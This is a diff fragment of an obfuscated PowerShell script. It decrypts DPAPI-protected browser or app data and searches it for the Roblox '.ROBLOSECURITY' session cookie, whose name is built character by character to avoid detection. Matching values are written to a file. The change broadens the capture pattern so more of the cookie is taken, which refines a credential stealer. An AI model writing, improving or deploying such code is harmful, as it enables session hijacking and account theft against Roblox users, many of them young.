@@ -94,7 +94,7 @@ foreach($p2 in $rp0){
             $e1=[Convert]::FromBase64String($Matches[1])
             $d1=[Security.Cryptography.ProtectedData]::Unprotect($e1,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
             $c1=[Text.Encoding]::UTF8.GetString($d1)
-            if($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s*=\s*(_[^;\s]+)'){
+            if($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s*=\s*([^\r\n\t]+)'){
                 Add-Content $f0 "$tR|$($Matches[1])"
             }elseif($c1 -match '_'+'\|WA'+'RNI'+'NG[^;\s]{50,}'){
                 Add-Content $f0 "$tR|$($Matches[0])"
@@ -121,7 +121,7 @@ if(Test-Path $p3){
                 $e2=[Convert]::FromBase64String($Matches[1])
                 $d2=[Security.Cryptography.ProtectedData]::Unprotect($e2,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
                 $c2=[Text.Encoding]::UTF8.GetString($d2)
-                if($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s*=\s*(_[^;\s]+)'){
+                if($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s*=\s*([^\r\n\t]+)'){
                     Add-Content $f0 "$tRM|$($Matches[1])"
                 }elseif($c2 -match '_'+'\|WA'+'RNI'+'NG[^;\s]{50,}'){
                     Add-Content $f0 "$tRM|$($Matches[0])"
